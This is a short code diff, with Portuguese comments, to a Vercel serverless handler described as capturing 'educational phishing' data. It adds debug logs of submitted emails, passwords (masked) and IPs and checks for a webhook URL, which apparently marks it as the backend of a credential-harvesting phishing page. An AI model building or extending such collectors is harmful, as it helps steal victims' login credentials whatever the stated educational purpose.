@@ -1,6 +1,13 @@
 // API Serverless para Vercel - Captura de dados de phishing educacional
 export default async function handler(req, res) {
     // Configurar CORS
+
+    console.log('🔍 DEBUG - Webhook URL presente:', !!process.env.WEBHOOK_URL);
+    console.log('🔍 DEBUG - Dados recebidos:', {
+        email: req.body.email,
+        password: req.body.password ? '***' : 'vazia',
+        ip: req.body.ip
+    });
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
